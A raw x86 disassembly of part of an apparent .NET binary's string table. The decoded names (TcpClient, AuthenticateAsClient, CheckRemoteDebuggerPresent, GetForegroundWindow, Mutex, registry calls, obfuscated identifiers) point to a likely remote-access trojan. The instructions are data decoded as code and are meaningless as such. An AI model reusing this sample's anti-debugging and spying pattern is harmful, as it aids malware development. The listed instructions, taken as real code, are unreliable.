  409a52:	54                   	push   %esp
  409a53:	63 70 43             	arpl   %esi,0x43(%eax)
  409a56:	6c                   	insb   (%dx),%es:(%edi)
  409a57:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409a5e:	74 5f                	je     0x409abf
  409a60:	54                   	push   %esp
  409a61:	63 70 43             	arpl   %esi,0x43(%eax)
  409a64:	6c                   	insb   (%dx),%es:(%edi)
  409a65:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  409a6c:	74 68                	je     0x409ad6
  409a6e:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a70:	74 69                	je     0x409adb
  409a72:	63 61 74             	arpl   %esp,0x74(%ecx)
  409a75:	65 41                	gs inc %ecx
  409a77:	73 43                	jae    0x409abc
  409a79:	6c                   	insb   (%dx),%es:(%edi)
  409a7a:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  409a81:	73 74                	jae    0x409af7
  409a83:	65 6d                	gs insl (%dx),%es:(%edi)
  409a85:	2e 4d                	cs dec %ebp
  409a87:	61                   	popa
  409a88:	6e                   	outsb  %ds:(%esi),(%dx)
  409a89:	61                   	popa
  409a8a:	67 65 6d             	gs insl (%dx),%es:(%di)
  409a8d:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a8f:	74 00                	je     0x409a91
  409a91:	45                   	inc    %ebp
  409a92:	6e                   	outsb  %ds:(%esi),(%dx)
  409a93:	76 69                	jbe    0x409afe
  409a95:	72 6f                	jb     0x409b06
  409a97:	6e                   	outsb  %ds:(%esi),(%dx)
  409a98:	6d                   	insl   (%dx),%es:(%edi)
  409a99:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a9b:	74 00                	je     0x409a9d
  409a9d:	53                   	push   %ebx
  409a9e:	79 73                	jns    0x409b13
  409aa0:	74 65                	je     0x409b07
  409aa2:	6d                   	insl   (%dx),%es:(%edi)
  409aa3:	2e 43                	cs inc %ebx
  409aa5:	6f                   	outsl  %ds:(%esi),(%dx)
  409aa6:	6c                   	insb   (%dx),%es:(%edi)
  409aa7:	6c                   	insb   (%dx),%es:(%edi)
  409aa8:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409aad:	6e                   	outsb  %ds:(%esi),(%dx)
  409aae:	73 2e                	jae    0x409ade
  409ab0:	49                   	dec    %ecx
  409ab1:	45                   	inc    %ebp
  409ab2:	6e                   	outsb  %ds:(%esi),(%dx)
  409ab3:	75 6d                	jne    0x409b22
  409ab5:	65 72 61             	gs jb  0x409b19
  409ab8:	74 6f                	je     0x409b29
  409aba:	72 2e                	jb     0x409aea
  409abc:	67 65 74 5f          	addr16 gs je 0x409b1f
  409ac0:	43                   	inc    %ebx
  409ac1:	75 72                	jne    0x409b35
  409ac3:	72 65                	jb     0x409b2a
  409ac5:	6e                   	outsb  %ds:(%esi),(%dx)
  409ac6:	74 00                	je     0x409ac8
  409ac8:	47                   	inc    %edi
  409ac9:	65 74 43             	gs je  0x409b0f
  409acc:	75 72                	jne    0x409b40
  409ace:	72 65                	jb     0x409b35
  409ad0:	6e                   	outsb  %ds:(%esi),(%dx)
  409ad1:	74 00                	je     0x409ad3
  409ad3:	43                   	inc    %ebx
  409ad4:	68 65 63 6b 52       	push   $0x526b6365
  409ad9:	65 6d                	gs insl (%dx),%es:(%edi)
  409adb:	6f                   	outsl  %ds:(%esi),(%dx)
  409adc:	74 65                	je     0x409b43
  409ade:	44                   	inc    %esp
  409adf:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  409ae3:	67 65 72 50          	addr16 gs jb 0x409b37
  409ae7:	72 65                	jb     0x409b4e
  409ae9:	73 65                	jae    0x409b50
  409aeb:	6e                   	outsb  %ds:(%esi),(%dx)
  409aec:	74 00                	je     0x409aee
  409aee:	67 65 74 5f          	addr16 gs je 0x409b51
  409af2:	52                   	push   %edx
  409af3:	65 6d                	gs insl (%dx),%es:(%edi)
  409af5:	6f                   	outsl  %ds:(%esi),(%dx)
  409af6:	74 65                	je     0x409b5d
  409af8:	45                   	inc    %ebp
  409af9:	6e                   	outsb  %ds:(%esi),(%dx)
  409afa:	64 50                	fs push %eax
  409afc:	6f                   	outsl  %ds:(%esi),(%dx)
  409afd:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  409b04:	5f                   	pop    %edi
  409b05:	43                   	inc    %ebx
  409b06:	6f                   	outsl  %ds:(%esi),(%dx)
  409b07:	75 6e                	jne    0x409b77
  409b09:	74 00                	je     0x409b0b
  409b0b:	67 65 74 5f          	addr16 gs je 0x409b6e
  409b0f:	50                   	push   %eax
  409b10:	72 6f                	jb     0x409b81
  409b12:	63 65 73             	arpl   %esp,0x73(%ebp)
  409b15:	73 6f                	jae    0x409b86
  409b17:	72 43                	jb     0x409b5c
  409b19:	6f                   	outsl  %ds:(%esi),(%dx)
  409b1a:	75 6e                	jne    0x409b8a
  409b1c:	74 00                	je     0x409b1e
  409b1e:	79 54                	jns    0x409b74
  409b20:	79 4f                	jns    0x409b71
  409b22:	57                   	push   %edi
  409b23:	4b                   	dec    %ebx
  409b24:	58                   	pop    %eax
  409b25:	69 41 6f 74 00 47 65 	imul   $0x65470074,0x6f(%ecx),%eax
  409b2c:	74 50                	je     0x409b7e
  409b2e:	61                   	popa
  409b2f:	74 68                	je     0x409b99
  409b31:	52                   	push   %edx
  409b32:	6f                   	outsl  %ds:(%esi),(%dx)
  409b33:	6f                   	outsl  %ds:(%esi),(%dx)
  409b34:	74 00                	je     0x409b36
  409b36:	51                   	push   %ecx
  409b37:	61                   	popa
  409b38:	49                   	dec    %ecx
  409b39:	4d                   	dec    %ebp
  409b3a:	55                   	push   %ebp
  409b3b:	65 56                	gs push %esi
  409b3d:	71 64                	jno    0x409ba3
  409b3f:	53                   	push   %ebx
  409b40:	59                   	pop    %ecx
  409b41:	72 70                	jb     0x409bb3
  409b43:	74 00                	je     0x409b45
  409b45:	50                   	push   %eax
  409b46:	61                   	popa
  409b47:	72 61                	jb     0x409baa
  409b49:	6d                   	insl   (%dx),%es:(%edi)
  409b4a:	65 74 65             	gs je  0x409bb2
  409b4d:	72 69                	jb     0x409bb8
  409b4f:	7a 65                	jp     0x409bb6
  409b51:	64 54                	fs push %esp
  409b53:	68 72 65 61 64       	push   $0x64616572
  409b58:	53                   	push   %ebx
  409b59:	74 61                	je     0x409bbc
  409b5b:	72 74                	jb     0x409bd1
  409b5d:	00 43 6f             	add    %al,0x6f(%ebx)
  409b60:	6e                   	outsb  %ds:(%esi),(%dx)
  409b61:	76 65                	jbe    0x409bc8
  409b63:	72 74                	jb     0x409bd9
  409b65:	00 46 61             	add    %al,0x61(%esi)
  409b68:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  409b6f:	54 
  409b70:	6f                   	outsl  %ds:(%esi),(%dx)
  409b71:	4c                   	dec    %esp
  409b72:	69 73 74 00 53 79 73 	imul   $0x73795300,0x74(%ebx),%esi
  409b79:	74 65                	je     0x409be0
  409b7b:	6d                   	insl   (%dx),%es:(%edi)
  409b7c:	2e 43                	cs inc %ebx
  409b7e:	6f                   	outsl  %ds:(%esi),(%dx)
  409b7f:	6c                   	insb   (%dx),%es:(%edi)
  409b80:	6c                   	insb   (%dx),%es:(%edi)
  409b81:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409b86:	6e                   	outsb  %ds:(%esi),(%dx)
  409b87:	73 2e                	jae    0x409bb7
  409b89:	49                   	dec    %ecx
  409b8a:	45                   	inc    %ebp
  409b8b:	6e                   	outsb  %ds:(%esi),(%dx)
  409b8c:	75 6d                	jne    0x409bfb
  409b8e:	65 72 61             	gs jb  0x409bf2
  409b91:	74 6f                	je     0x409c02
  409b93:	72 2e                	jb     0x409bc3
  409b95:	4d                   	dec    %ebp
  409b96:	6f                   	outsl  %ds:(%esi),(%dx)
  409b97:	76 65                	jbe    0x409bfe
  409b99:	4e                   	dec    %esi
  409b9a:	65 78 74             	gs js  0x409c11
  409b9d:	00 53 79             	add    %dl,0x79(%ebx)
  409ba0:	73 74                	jae    0x409c16
  409ba2:	65 6d                	gs insl (%dx),%es:(%edi)
  409ba4:	2e 54                	cs push %esp
  409ba6:	65 78 74             	gs js  0x409c1d
  409ba9:	00 47 65             	add    %al,0x65(%edi)
  409bac:	74 57                	je     0x409c05
  409bae:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  409bb5:	78 74                	js     0x409c2b
  409bb7:	00 63 72             	add    %ah,0x72(%ebx)
  409bba:	6d                   	insl   (%dx),%es:(%edi)
  409bbb:	6d                   	insl   (%dx),%es:(%edi)
  409bbc:	59                   	pop    %ecx
  409bbd:	78 71                	js     0x409c30
  409bbf:	63 43 6f             	arpl   %eax,0x6f(%ebx)
  409bc2:	47                   	inc    %edi
  409bc3:	75 00                	jne    0x409bc5
  409bc5:	79 45                	jns    0x409c0c
  409bc7:	67 42                	addr16 inc %edx
  409bc9:	64 76 78             	fs jbe 0x409c44
  409bcc:	6b 62 4f 4b          	imul   $0x4b,0x4f(%edx),%esp
  409bd0:	75 00                	jne    0x409bd2
  409bd2:	50                   	push   %eax
  409bd3:	61                   	popa
  409bd4:	75 7a                	jne    0x409c50
  409bd6:	4f                   	dec    %edi
  409bd7:	58                   	pop    %eax
  409bd8:	4b                   	dec    %ebx
  409bd9:	45                   	inc    %ebp
  409bda:	79 72                	jns    0x409c4e
  409bdc:	66 6a 58             	pushw  $0x58
  409bdf:	75 00                	jne    0x409be1
  409be1:	6c                   	insb   (%dx),%es:(%edi)
  409be2:	56                   	push   %esi
  409be3:	69 6f 55 43 4f 6d 5a 	imul   $0x5a6d4f43,0x55(%edi),%ebp
  409bea:	75 00                	jne    0x409bec
  409bec:	65 76 6e             	gs jbe 0x409c5d
  409bef:	5a                   	pop    %edx
  409bf0:	56                   	push   %esi
  409bf1:	67 50                	addr16 push %eax
  409bf3:	62 75 62             	bound  %esi,0x62(%ebp)
  409bf6:	61                   	popa
  409bf7:	5a                   	pop    %edx
  409bf8:	49                   	dec    %ecx
  409bf9:	59                   	pop    %ecx
  409bfa:	68 75 00 72 52       	push   $0x52720075
  409bff:	54                   	push   %esp
  409c00:	6f                   	outsl  %ds:(%esi),(%dx)
  409c01:	77 50                	ja     0x409c53
  409c03:	79 6a                	jns    0x409c6f
  409c05:	75 68                	jne    0x409c6f
  409c07:	75 00                	jne    0x409c09
  409c09:	52                   	push   %edx
  409c0a:	59                   	pop    %ecx
  409c0b:	4d                   	dec    %ebp
  409c0c:	4c                   	dec    %esp
  409c0d:	4a                   	dec    %edx
  409c0e:	6b 46 63 49          	imul   $0x49,0x63(%esi),%eax
  409c12:	6d                   	insl   (%dx),%es:(%edi)
  409c13:	75 00                	jne    0x409c15
  409c15:	4e                   	dec    %esi
  409c16:	63 50 6b             	arpl   %edx,0x6b(%eax)
  409c19:	4c                   	dec    %esp
  409c1a:	53                   	push   %ebx
  409c1b:	49                   	dec    %ecx
  409c1c:	57                   	push   %edi
  409c1d:	65 74 78             	gs je  0x409c98
  409c20:	48                   	dec    %eax
  409c21:	70 75                	jo     0x409c98
  409c23:	00 4c 47 7a          	add    %cl,0x7a(%edi,%eax,2)
  409c27:	58                   	pop    %eax
  409c28:	6d                   	insl   (%dx),%es:(%edi)
  409c29:	68 41 47 50 72       	push   $0x72504741
  409c2e:	75 00                	jne    0x409c30
  409c30:	56                   	push   %esi
  409c31:	50                   	push   %eax
  409c32:	76 74                	jbe    0x409ca8
  409c34:	76 69                	jbe    0x409c9f
  409c36:	59                   	pop    %ecx
  409c37:	51                   	push   %ecx
  409c38:	42                   	inc    %edx
  409c39:	77 65                	ja     0x409ca0
  409c3b:	75 75                	jne    0x409cb2
  409c3d:	00 76 53             	add    %dh,0x53(%esi)
  409c40:	67 66 7a 4e          	addr16 data16 jp 0x409c92
  409c44:	55                   	push   %ebp
  409c45:	6d                   	insl   (%dx),%es:(%edi)
  409c46:	52                   	push   %edx
  409c47:	47                   	inc    %edi
  409c48:	79 65                	jns    0x409caf
  409c4a:	76 00                	jbe    0x409c4c
  409c4c:	42                   	inc    %edx
  409c4d:	6a 66                	push   $0x66
  409c4f:	6b 72 42 41          	imul   $0x41,0x42(%edx),%esi
  409c53:	69 68 76 00 7a 72 76 	imul   $0x76727a00,0x76(%eax),%ebp
  409c5a:	72 54                	jb     0x409cb0
  409c5c:	53                   	push   %ebx
  409c5d:	54                   	push   %esp
  409c5e:	50                   	push   %eax
  409c5f:	6c                   	insb   (%dx),%es:(%edi)
  409c60:	53                   	push   %ebx
  409c61:	73 76                	jae    0x409cd9
  409c63:	00 47 65             	add    %al,0x65(%edi)
  409c66:	74 46                	je     0x409cae
  409c68:	6f                   	outsl  %ds:(%esi),(%dx)
  409c69:	72 65                	jb     0x409cd0
  409c6b:	67 72 6f             	addr16 jb 0x409cdd
  409c6e:	75 6e                	jne    0x409cde
  409c70:	64 57                	fs push %edi
  409c72:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  409c79:	65 74 5f             	gs je  0x409cdb
  409c7c:	43                   	inc    %ebx
  409c7d:	72 65                	jb     0x409ce4
  409c7f:	61                   	popa
  409c80:	74 65                	je     0x409ce7
  409c82:	4e                   	dec    %esi
  409c83:	6f                   	outsl  %ds:(%esi),(%dx)
  409c84:	57                   	push   %edi
  409c85:	69 6e 64 6f 77 00 62 	imul   $0x6200776f,0x64(%esi),%ebp
  409c8c:	75 41                	jne    0x409ccf
  409c8e:	71 6b                	jno    0x409cfb
  409c90:	41                   	inc    %ecx
  409c91:	4e                   	dec    %esi
  409c92:	54                   	push   %esp
  409c93:	49                   	dec    %ecx
  409c94:	48                   	dec    %eax
  409c95:	7a 75                	jp     0x409d0c
  409c97:	77 00                	ja     0x409c99
  409c99:	51                   	push   %ecx
  409c9a:	4f                   	dec    %edi
  409c9b:	58                   	pop    %eax
  409c9c:	70 56                	jo     0x409cf4
  409c9e:	70 65                	jo     0x409d05
  409ca0:	58                   	pop    %eax
  409ca1:	5a                   	pop    %edx
  409ca2:	77 77                	ja     0x409d1b
  409ca4:	00 75 59             	add    %dh,0x59(%ebp)
  409ca7:	58                   	pop    %eax
  409ca8:	76 70                	jbe    0x409d1a
  409caa:	65 6c                	gs insb (%dx),%es:(%edi)
  409cac:	51                   	push   %ecx
  409cad:	78 77                	js     0x409d26
  409caf:	00 75 64             	add    %dh,0x64(%ebp)
  409cb2:	65 66 4f             	gs dec %di
  409cb5:	73 46                	jae    0x409cfd
  409cb7:	77 52                	ja     0x409d0b
  409cb9:	45                   	inc    %ebp
  409cba:	78 00                	js     0x409cbc
  409cbc:	68 6c 66 6e 5a       	push   $0x5a6e666c
  409cc1:	47                   	inc    %edi
  409cc2:	55                   	push   %ebp
  409cc3:	4c                   	dec    %esp
  409cc4:	57                   	push   %edi
  409cc5:	48                   	dec    %eax
  409cc6:	4f                   	dec    %edi
  409cc7:	63 45 78             	arpl   %eax,0x78(%ebp)
  409cca:	00 67 56             	add    %ah,0x56(%edi)
  409ccd:	6a 56                	push   $0x56
  409ccf:	63 49 74             	arpl   %ecx,0x74(%ecx)
  409cd2:	71 78                	jno    0x409d4c
  409cd4:	47                   	inc    %edi
  409cd5:	78 00                	js     0x409cd7
  409cd7:	54                   	push   %esp
  409cd8:	57                   	push   %edi
  409cd9:	4c                   	dec    %esp
  409cda:	6f                   	outsl  %ds:(%esi),(%dx)
  409cdb:	6c                   	insb   (%dx),%es:(%edi)
  409cdc:	63 4a 53             	arpl   %ecx,0x53(%edx)
  409cdf:	4f                   	dec    %edi
  409ce0:	78 00                	js     0x409ce2
  409ce2:	67 66 78 70          	addr16 data16 js 0x409d56
  409ce6:	64 4f                	fs dec %edi
  409ce8:	4d                   	dec    %ebp
  409ce9:	48                   	dec    %eax
  409cea:	77 69                	ja     0x409d55
  409cec:	6f                   	outsl  %ds:(%esi),(%dx)
  409ced:	77 59                	ja     0x409d48
  409cef:	78 00                	js     0x409cf1
  409cf1:	68 65 41 4d 59       	push   $0x594d4165
  409cf6:	65 47                	gs inc %edi
  409cf8:	74 72                	je     0x409d6c
  409cfa:	59                   	pop    %ecx
  409cfb:	79 63                	jns    0x409d60
  409cfd:	78 00                	js     0x409cff
  409cff:	50                   	push   %eax
  409d00:	66 44                	inc    %sp
  409d02:	44                   	inc    %esp
  409d03:	45                   	inc    %ebp
  409d04:	79 56                	jns    0x409d5c
  409d06:	6a 7a                	push   $0x7a
  409d08:	64 78 00             	fs js  0x409d0b
  409d0b:	4d                   	dec    %ebp
  409d0c:	75 74                	jne    0x409d82
  409d0e:	65 78 00             	gs js  0x409d11
  409d11:	5a                   	pop    %edx
  409d12:	74 6a                	je     0x409d7e
  409d14:	65 72 49             	gs jb  0x409d60
  409d17:	62 49 76             	bound  %ecx,0x76(%ecx)
  409d1a:	6f                   	outsl  %ds:(%esi),(%dx)
  409d1b:	78 00                	js     0x409d1d
  409d1d:	71 43                	jno    0x409d62
  409d1f:	49                   	dec    %ecx
  409d20:	7a 73                	jp     0x409d95
  409d22:	48                   	dec    %eax
  409d23:	74 4d                	je     0x409d72
  409d25:	52                   	push   %edx
  409d26:	69 6f 4c 44 4c 4f 7a 	imul   $0x7a4f4c44,0x4c(%edi),%ebp
  409d2d:	78 00                	js     0x409d2f
  409d2f:	68 73 43 4f 54       	push   $0x544f4373
  409d34:	4c                   	dec    %esp
  409d35:	67 76 43             	addr16 jbe 0x409d7b
  409d38:	4e                   	dec    %esi
  409d39:	49                   	dec    %ecx
  409d3a:	43                   	inc    %ebx
  409d3b:	44                   	inc    %esp
  409d3c:	79 00                	jns    0x409d3e
  409d3e:	56                   	push   %esi
  409d3f:	51                   	push   %ecx
  409d40:	72 56                	jb     0x409d98
  409d42:	77 4a                	ja     0x409d8e
  409d44:	65 6b 72 57 79       	imul   $0x79,%gs:0x57(%edx),%esi
  409d49:	00 49 6e             	add    %cl,0x6e(%ecx)
  409d4c:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409d53:	65 
  409d54:	41                   	inc    %ecx
  409d55:	72 72                	jb     0x409dc9
  409d57:	61                   	popa
  409d58:	79 00                	jns    0x409d5a
  409d5a:	54                   	push   %esp
  409d5b:	6f                   	outsl  %ds:(%esi),(%dx)
  409d5c:	41                   	inc    %ecx
  409d5d:	72 72                	jb     0x409dd1
  409d5f:	61                   	popa
  409d60:	79 00                	jns    0x409d62
  409d62:	67 65 74 5f          	addr16 gs je 0x409dc5
  409d66:	41                   	inc    %ecx
  409d67:	73 41                	jae    0x409daa
  409d69:	72 72                	jb     0x409ddd
  409d6b:	61                   	popa
  409d6c:	79 00                	jns    0x409d6e
  409d6e:	67 65 74 5f          	addr16 gs je 0x409dd1
  409d72:	4b                   	dec    %ebx
  409d73:	65 79 00             	gs jns 0x409d76
  409d76:	73 65                	jae    0x409ddd
  409d78:	74 5f                	je     0x409dd9
  409d7a:	4b                   	dec    %ebx
  409d7b:	65 79 00             	gs jns 0x409d7e
  409d7e:	43                   	inc    %ebx
  409d7f:	72 65                	jb     0x409de6
  409d81:	61                   	popa
  409d82:	74 65                	je     0x409de9
  409d84:	53                   	push   %ebx
  409d85:	75 62                	jne    0x409de9
  409d87:	4b                   	dec    %ebx
  409d88:	65 79 00             	gs jns 0x409d8b
  409d8b:	4f                   	dec    %edi
  409d8c:	70 65                	jo     0x409df3
  409d8e:	6e                   	outsb  %ds:(%esi),(%dx)
  409d8f:	53                   	push   %ebx
  409d90:	75 62                	jne    0x409df4
  409d92:	4b                   	dec    %ebx
  409d93:	65 79 00             	gs jns 0x409d96
  409d96:	67 65 74 5f          	addr16 gs je 0x409df9
  409d9a:	50                   	push   %eax
  409d9b:	75 62                	jne    0x409dff
  409d9d:	6c                   	insb   (%dx),%es:(%edi)
  409d9e:	69 63 4b 65 79 00 52 	imul   $0x52007965,0x4b(%ebx),%esp
  409da5:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409dac:	4b 65 
  409dae:	79 00                	jns    0x409db0
  409db0:	76 6d                	jbe    0x409e1f
  409db2:	50                   	push   %eax
  409db3:	68 61 46 44 46       	push   $0x46444661
  409db8:	68 79 00 53 79       	push   $0x79530079
  409dbd:	73 74                	jae    0x409e33
  409dbf:	65 6d                	gs insl (%dx),%es:(%edi)
  409dc1:	2e 53                	cs push %ebx
  409dc3:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409dc7:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409dce:	70 
  409dcf:	74 6f                	je     0x409e40
  409dd1:	67 72 61             	addr16 jb 0x409e35
  409dd4:	70 68                	jo     0x409e3e
  409dd6:	79 00                	jns    0x409dd8
  409dd8:	41                   	inc    %ecx
  409dd9:	73 73                	jae    0x409e4e
  409ddb:	65 6d                	gs insl (%dx),%es:(%edi)
  409ddd:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409de1:	41                   	inc    %ecx
  409de2:	64 64 72 65          	fs fs jb 0x409e4b
  409de6:	73 73                	jae    0x409e5b
  409de8:	46                   	inc    %esi
  409de9:	61                   	popa
  409dea:	6d                   	insl   (%dx),%es:(%edi)
  409deb:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  409df2:	63 
  409df3:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  409df7:	79 00                	jns    0x409df9
  409df9:	54                   	push   %esp
  409dfa:	6f                   	outsl  %ds:(%esi),(%dx)
  409dfb:	42                   	inc    %edx
  409dfc:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  409e03:	65 74 5f             	gs je  0x409e65
  409e06:	53                   	push   %ebx
  409e07:	79 73                	jns    0x409e7c
  409e09:	74 65                	je     0x409e70
  409e0b:	6d                   	insl   (%dx),%es:(%edi)
  409e0c:	44                   	inc    %esp
  409e0d:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409e14:	79 00                	jns    0x409e16
  409e16:	52                   	push   %edx
  409e17:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  409e1e:	00 6f 
  409e20:	70 5f                	jo     0x409e81
  409e22:	45                   	inc    %ebp
  409e23:	71 75                	jno    0x409e9a
  409e25:	61                   	popa
  409e26:	6c                   	insb   (%dx),%es:(%edi)
  409e27:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  409e2e:	49 
  409e2f:	6e                   	outsb  %ds:(%esi),(%dx)
  409e30:	65 71 75             	gs jno 0x409ea8
  409e33:	61                   	popa
  409e34:	6c                   	insb   (%dx),%es:(%edi)
  409e35:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  409e3c:	74 
  409e3d:	65 6d                	gs insl (%dx),%es:(%edi)
  409e3f:	2e 4e                	cs dec %esi
  409e41:	65 74 2e             	gs je  0x409e72
  409e44:	53                   	push   %ebx
  409e45:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409e49:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  409e50:	64 
  409e51:	6f                   	outsl  %ds:(%esi),(%dx)
  409e52:	77 73                	ja     0x409ec7
  409e54:	49                   	dec    %ecx
  409e55:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409e58:	74 69                	je     0x409ec3
  409e5a:	74 79                	je     0x409ed5
  409e5c:	00 49 73             	add    %cl,0x73(%ecx)
  409e5f:	4e                   	dec    %esi
  409e60:	75 6c                	jne    0x409ece
  409e62:	6c                   	insb   (%dx),%es:(%edi)
  409e63:	4f                   	dec    %edi
  409e64:	72 45                	jb     0x409eab
  409e66:	6d                   	insl   (%dx),%es:(%edi)
  409e67:	70 74                	jo     0x409edd
  409e69:	79 00                	jns    0x409e6b
  409e6b:	70 7a                	jo     0x409ee7
  409e6d:	4c                   	dec    %esp
  409e6e:	7a 4b                	jp     0x409ebb
  409e70:	4a                   	dec    %edx
  409e71:	58                   	pop    %eax
  409e72:	47                   	inc    %edi
  409e73:	76 74                	jbe    0x409ee9
  409e75:	79 00                	jns    0x409e77
  409e77:	65 51                	gs push %ecx
  409e79:	41                   	inc    %ecx
  409e7a:	77 6a                	ja     0x409ee6
  409e7c:	44                   	inc    %esp
  409e7d:	67 62 6d 79          	bound  %ebp,0x79(%di)
  409e81:	77 79                	ja     0x409efc
  409e83:	00 44 50 6d          	add    %al,0x6d(%eax,%edx,2)
  409e87:	42                   	inc    %edx
  409e88:	68 6b 77 4e 53       	push   $0x534e776b
  409e8d:	6c                   	insb   (%dx),%es:(%edi)
  409e8e:	47                   	inc    %edi
  409e8f:	46                   	inc    %esi
  409e90:	7a 00                	jp     0x409e92
  409e92:	69 7a 58 75 64 42 4d 	imul   $0x4d426475,0x58(%edx),%edi
  409e99:	6d                   	insl   (%dx),%es:(%edi)
  409e9a:	56                   	push   %esi
  409e9b:	50                   	push   %eax
  409e9c:	55                   	push   %ebp
  409e9d:	6b 66 47 7a          	imul   $0x7a,0x47(%esi),%esp
  409ea1:	00 75 55             	add    %dh,0x55(%ebp)
  409ea4:	50                   	push   %eax
  409ea5:	53                   	push   %ebx
  409ea6:	5a                   	pop    %edx
  409ea7:	62 46 4d             	bound  %eax,0x4d(%esi)
  409eaa:	45                   	inc    %ebp
  409eab:	6e                   	outsb  %ds:(%esi),(%dx)
  409eac:	47                   	inc    %edi
  409ead:	7a 00                	jp     0x409eaf
  409eaf:	68 78 64 57 57       	push   $0x57576478
  409eb4:	6c                   	insb   (%dx),%es:(%edi)
  409eb5:	50                   	push   %eax
  409eb6:	58                   	pop    %eax
  409eb7:	76 69                	jbe    0x409f22
  409eb9:	79 51                	jns    0x409f0c
  409ebb:	6b 4a 7a 00          	imul   $0x0,0x7a(%edx),%ecx
  409ebf:	55                   	push   %ebp
  409ec0:	49                   	dec    %ecx
  409ec1:	49                   	dec    %ecx
  409ec2:	73 4d                	jae    0x409f11
  409ec4:	67 69 52 59 59 76 57 	imul   $0x59577659,0x59(%bp,%si),%edx
  409ecb:	59 
  409ecc:	7a 00                	jp     0x409ece
  409ece:	72 70                	jb     0x409f40
  409ed0:	47                   	inc    %edi
  409ed1:	6f                   	outsl  %ds:(%esi),(%dx)
  409ed2:	67 6d                	insl   (%dx),%es:(%di)
  409ed4:	50                   	push   %eax
  409ed5:	44                   	inc    %esp
  409ed6:	6f                   	outsl  %ds:(%esi),(%dx)
  409ed7:	6b 47 5a 7a          	imul   $0x7a,0x5a(%edi),%eax
  409edb:	00 72 71             	add    %dh,0x71(%edx)
  409ede:	4c                   	dec    %esp
  409edf:	76 58                	jbe    0x409f39
  409ee1:	4b                   	dec    %ebx
  409ee2:	75 78                	jne    0x409f5c
  409ee4:	6d                   	insl   (%dx),%es:(%edi)
  409ee5:	50                   	push   %eax
  409ee6:	6c                   	insb   (%dx),%es:(%edi)
  409ee7:	7a 00                	jp     0x409ee9
  409ee9:	76 59                	jbe    0x409f44
  409eeb:	48                   	dec    %eax
  409eec:	61                   	popa
  409eed:	42                   	inc    %edx
  409eee:	74 4b                	je     0x409f3b
  409ef0:	64 41                	fs inc %ecx
  409ef2:	72 7a                	jb     0x409f6e
  409ef4:	00 66 50             	add    %ah,0x50(%esi)
  409ef7:	4a                   	dec    %edx
  409ef8:	77 6f                	ja     0x409f69
  409efa:	51                   	push   %ecx
  409efb:	53                   	push   %ebx
  409efc:	70 64                	jo     0x409f62
  409efe:	72 7a                	jb     0x409f7a
  409f00:	00 00                	add    %al,(%eax)
  409f02:	00 00                	add    %al,(%eax)
  409f04:	00 0d 53 00 48 00    	add    %cl,0x480053
  409f0a:	41                   	inc    %ecx
  409f0b:	00 32                	add    %dh,(%edx)
  409f0d:	00 35 00 36 00 00    	add    %dh,0x3600
  409f13:	80 d9 6a             	sbb    $0x6a,%cl
  409f16:	00 73 00             	add    %dh,0x0(%ebx)
  409f19:	42                   	inc    %edx
  409f1a:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  409f1e:	00 62 00             	add    %ah,0x0(%edx)
  409f21:	74 00                	je     0x409f23
  409f23:	68 00 50 00 33       	push   $0x33005000
  409f28:	00 44 00 68          	add    %al,0x68(%eax,%eax,1)
  409f2c:	00 2b                	add    %ch,(%ebx)
  409f2e:	00 30                	add    %dh,(%eax)
  409f30:	00 64 00 2f          	add    %ah,0x2f(%eax,%eax,1)
  409f34:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  409f38:	00 70 00             	add    %dh,0x0(%eax)
  409f3b:	43                   	inc    %ebx
  409f3c:	00 39                	add    %bh,(%ecx)
  409f3e:	00 32                	add    %dh,(%edx)
  409f40:	00 70 00             	add    %dh,0x0(%eax)
  409f43:	4c                   	dec    %esp
  409f44:	00 79 00             	add    %bh,0x0(%ecx)
  409f47:	34 00                	xor    $0x0,%al
  409f49:	48                   	dec    %eax
  409f4a:	00 50 00             	add    %dl,0x0(%eax)
  409f4d:	4b                   	dec    %ebx
  409f4e:	00 34 00             	add    %dh,(%eax,%eax,1)
  409f51:	4d                   	dec    %ebp
  409f52:	00 32                	add    %dh,(%edx)
  409f54:	00 61 00             	add    %ah,0x0(%ecx)
  409f57:	50                   	push   %eax
  409f58:	00 45 00             	add    %al,0x0(%ebp)
  409f5b:	45                   	inc    %ebp
  409f5c:	00 59 00             	add    %bl,0x0(%ecx)
  409f5f:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
